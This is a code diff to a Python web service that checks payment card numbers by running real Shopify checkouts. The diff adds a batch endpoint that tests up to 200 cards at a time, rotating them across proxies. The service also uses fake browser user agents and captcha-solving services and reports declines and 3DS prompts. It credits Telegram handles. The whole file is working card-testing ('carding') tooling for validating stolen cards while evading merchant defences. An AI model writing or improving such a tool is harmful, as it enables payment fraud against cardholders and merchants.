@@ -3,12 +3,15 @@ import asyncio
 import random
 import re
 import json
+import threading
 from urllib.parse import urlparse
 
 import httpx
 from fake_useragent import UserAgent
 from fastapi import FastAPI, Query, HTTPException
 from fastapi.responses import JSONResponse
+from pydantic import BaseModel
+from typing import List, Optional
 import uvicorn
 
 # Optional captcha solver libraries
@@ -946,6 +949,67 @@ Channel: syncchats.t.me
 
     return result
 
+
+# ───────────────────────────────── Concurrency Engine ─────────────────────────────────
+
+MAX_CONCURRENT = 200          # max cards in flight at once
+_loop = None                 # single shared event loop
+_loop_thread = None
+_semaphore = None            # asyncio.Semaphore(MAX_CONCURRENT)
+
+def _start_background_loop(loop):
+    """Run the event loop forever in a background thread."""
+    asyncio.set_event_loop(loop)
+    loop.run_forever()
+
+def get_event_loop():
+    """Return the shared event loop, starting it if needed."""
+    global _loop, _loop_thread, _semaphore
+    if _loop is None or _loop.is_closed():
+        _loop = asyncio.new_event_loop()
+        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+        _loop_thread = threading.Thread(target=_start_background_loop, args=(_loop,), daemon=True)
+        _loop_thread.start()
+    return _loop
+
+async def _throttled_checkout(site_url, cc, month, year, cvv, proxy, solver, solver_key):
+    """Process a single card, guarded by the concurrency semaphore."""
+    async with _semaphore:
+        return await run_shopify_checkout(site_url, cc, month, year, cvv, proxy, solver, solver_key)
+
+def _build_result(result):
+    """Build clean result dict from run_shopify_checkout output."""
+    clean = {
+        "Response": result["Response"],
+        "CC": result["CC"],
+        "Price": result["Price"],
+        "Gate": result["Gate"],
+        "Site": result["Site"],
+        "t.me": "@xaed3n"
+    }
+    # If it's a decline and we have a specific error code, use it unless it's CAPTCHA_REQUIRED
+    if result["Response"] == "CARD_DECLINED":
+        error_detail = None
+        if "error" in result.get("details", {}):
+            err = result["details"]["error"]
+            if isinstance(err, dict) and "code" in err:
+                error_detail = err["code"]
+            elif isinstance(err, str):
+                error_detail = err
+        elif "errors" in result.get("details", {}):
+            errors = result["details"]["errors"]
+            if errors and isinstance(errors, list):
+                error_detail = errors[0] if errors else "UNKNOWN"
+        if error_detail:
+            if error_detail != "CAPTCHA_REQUIRED":
+                clean["Response"] = error_detail
+
+    # Include redirect URL for 3DS cases
+    if result["Response"] in ("3DS_REQUIRED", "OTP_REQUIRED", "OTP", "ACTION_REQUIRED") and "redirect_url" in result.get("details", {}):
+        clean["redirect_url"] = result["details"]["redirect_url"]
+
+    return clean
+
 # ------------------------------------------------------------
 #  FastAPI app
 # ------------------------------------------------------------
@@ -964,99 +1028,132 @@ async def shopify_check(
     except ValueError:
         raise HTTPException(status_code=400, detail="Invalid cc format. Use cc|mm|yy|cvv")
 
-    # CHANGE: Use concurrent version (remove await)
-    result = run_concurrent_checkout(url, cc_num, month, year, cvv, proxy, solver, solver_key)
+    loop = get_event_loop()
+    future = asyncio.run_coroutine_threadsafe(
+        _throttled_checkout(url, cc_num, month, year, cvv, proxy, solver, solver_key),
+        loop
+    )
+    try:
+        result = future.result(timeout=120)
+    except Exception as e:
+        raise HTTPException(status_code=500, detail={"error": str(e)})
 
     if result["Response"] in ("ERROR", "EXCEPTION"):
         raise HTTPException(status_code=500, detail=result)
 
-    # Build clean response
-    clean_result = {
-        "Response": result["Response"],
-        "CC": result["CC"],
-        "Price": result["Price"],
-        "Gate": result["Gate"],
-        "Site": result["Site"],
-        "t.me": "@NIKSHACKS"
-    }
-
-    # If it's a decline and we have a specific error code, use it unless it's CAPTCHA_REQUIRED
-    if result["Response"] == "CARD_DECLINED":
-        error_detail = None
-        if "error" in result.get("details", {}):
-            err = result["details"]["error"]
-            if isinstance(err, dict) and "code" in err:
-                error_detail = err["code"]
-            elif isinstance(err, str):
-                error_detail = err
-        elif "errors" in result.get("details", {}):
-            errors = result["details"]["errors"]
-            if errors and isinstance(errors, list):
-                error_detail = errors[0] if errors else "UNKNOWN"
-        if error_detail:
-            # If error code is CAPTCHA_REQUIRED, keep as CARD_DECLINED, otherwise use the code
-            if error_detail != "CAPTCHA_REQUIRED":
-                clean_result["Response"] = error_detail
-            # else leave as CARD_DECLINED
-
-    # Include redirect URL for 3DS cases
-    if result["Response"] in ("3DS_REQUIRED", "ACTION_REQUIRED") and "redirect_url" in result.get("details", {}):
-        clean_result["redirect_url"] = result["details"]["redirect_url"]
-
-    # Print final response to terminal
+    clean_result = _build_result(result)
     print(f"\033[93mResponse: {json.dumps(clean_result)}\033[0m")
-
     return clean_result
 
 
-# ──────────────────────── Concurrency Engine ────────────────────────
-import threading
+# ───────────────────────────────── Batch Request Model ─────────────────────────────────
 
-MAX_CONCURRENT = 200
-_loop = None
-_loop_thread = None
-_semaphore = None
+class BatchRequest(BaseModel):
+    url: str
+    cards: List[str]
+    proxy: Optional[str] = None
+    proxies: Optional[List[str]] = None
+    solver: Optional[str] = None
+    solver_key: Optional[str] = None
 
-def _start_background_loop(loop):
-    asyncio.set_event_loop(loop)
-    loop.run_forever()
 
-def get_event_loop():
-    global _loop, _loop_thread, _semaphore
-    if _loop is None or _loop.is_closed():
-        _loop = asyncio.new_event_loop()
-        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-        _loop_thread = threading.Thread(target=_start_background_loop, args=(_loop,), daemon=True)
-        _loop_thread.start()
-    return _loop
+# ───────────────────────────────── Batch endpoint ─────────────────────────────────
 
-async def _throttled_checkout(site_url, cc, month, year, cvv, proxy, solver, solver_key):
-    async with _semaphore:
-        return await run_shopify_checkout(site_url, cc, month, year, cvv, proxy, solver, solver_key)
+@app.post("/batch", response_class=JSONResponse)
+async def batch_checker(req: BatchRequest):
+    """
+    POST JSON body:
+    {
+      "url": "https://example.myshopify.com",
+      "cards": ["4111...|12|2030|123", "5200...|06|27|456", ...],
+      "proxy": "host:port:user:pass",
+      "proxies": ["proxy1", "proxy2", ...],
+      "solver": "2captcha",
+      "solver_key": "api_key"
+    }
+    Max 200 cards. If 'proxies' list given, cards rotate across them round-robin.
+    """
+    site = req.url
+    cards = req.cards
 
-def run_concurrent_checkout(site_url, cc, month, year, cvv, proxy=None, solver=None, solver_key=None):
+    # Proxy list support: round-robin across proxies
+    proxy_list = req.proxies or []
+    single_proxy = req.proxy
+    if not proxy_list and single_proxy:
+        proxy_list = [single_proxy]
+
+    if not site:
+        raise HTTPException(status_code=400, detail="Missing 'url' field")
+    if not cards or not isinstance(cards, list):
+        raise HTTPException(status_code=400, detail="Missing or invalid 'cards' array")
+    if len(cards) > MAX_CONCURRENT:
+        raise HTTPException(status_code=400, detail=f"Max {MAX_CONCURRENT} cards per batch")
+
+    # Parse all cards upfront and assign proxies round-robin
+    parsed = []
+    for i, cc_string in enumerate(cards):
+        proxy_for_card = proxy_list[i % len(proxy_list)] if proxy_list else None
+        try:
+            parts = cc_string.strip().split('|')
+            if len(parts) != 4:
+                raise ValueError("Invalid CC format")
+            cc_num, month, year, cvv = parts
+            parsed.append((cc_string.strip(), cc_num, month, year, cvv, proxy_for_card))
+        except ValueError:
+            parsed.append((cc_string.strip(), None, None, None, None, proxy_for_card))
+
     loop = get_event_loop()
-    future = asyncio.run_coroutine_threadsafe(
-        _throttled_checkout(site_url, cc, month, year, cvv, proxy, solver, solver_key),
-        loop
-    )
-    return future.result(timeout=120)
+
+    async def _run_batch():
+        tasks = []
+        for cc_string, cc_num, month, year, cvv, px in parsed:
+            if cc_num is None:
+                async def _bad(cs=cc_string):
+                    return cs, {"Response": "ERROR", "CC": cs, "Price": None, "Gate": "Unknown", "Site": site, "details": {"error": "Invalid CC format"}}
+                tasks.append(_bad())
+            else:
+                async def _check(cs=cc_string, cn=cc_num, m=month, y=year, cv=cvv, prx=px):
+                    try:
+                        res = await _throttled_checkout(site, cn, m, y, cv, prx, req.solver, req.solver_key)
+                        return cs, res
+                    except Exception as ex:
+                        return cs, {"Response": "EXCEPTION", "CC": cs, "Price": None, "Gate": "Unknown", "Site": site, "details": {"exception": str(ex)}}
+                tasks.append(_check())
+
+        return await asyncio.gather(*tasks)
+
+    future = asyncio.run_coroutine_threadsafe(_run_batch(), loop)
+    try:
+        results = future.result(timeout=120)
+    except Exception as e:
+        raise HTTPException(status_code=500, detail={"error": str(e)})
+
+    output = []
+    for cc_string, result in results:
+        output.append(_build_result(result))
+
+    return output
 
 
-@app.on_event("startup")
-async def startup_event():
-    get_event_loop()
-    print(f"🚀 Concurrency engine started (max {MAX_CONCURRENT})")
+# ───────────────────────────────── Status endpoint ─────────────────────────────────
 
-@app.on_event("shutdown")
-async def shutdown_event():
-    global _loop
-    if _loop and not _loop.is_closed():
-        _loop.call_soon_threadsafe(_loop.stop)
-        _loop.close()
+@app.get("/status", response_class=JSONResponse)
+async def status():
+    return {
+        "status": "online",
+        "max_concurrent": MAX_CONCURRENT,
+        "endpoints": {
+            "single": "GET /sh?cc=...&url=...&proxy=...&solver=...&solver_key=...",
+            "batch": "POST /batch {url, cards[], proxy, solver, solver_key}",
+            "status": "GET /status"
+        }
+    }
 
 
 if __name__ == "__main__":
+    print(f"[ENGINE] Max concurrency: {MAX_CONCURRENT} cards")
+    print(f"[ENGINE] Single: GET /sh?cc=...&url=...&proxy=...&solver=...&solver_key=...")
+    print(f"[ENGINE] Batch:  POST /batch {{url, cards[], proxy, solver, solver_key}}")
+    get_event_loop()  # pre-start the background loop
     port = int(os.environ.get("PORT", 8000))
-    uvicorn.run(app, host="0.0.0.0", port=port)
     uvicorn.run(app, host="0.0.0.0", port=port)
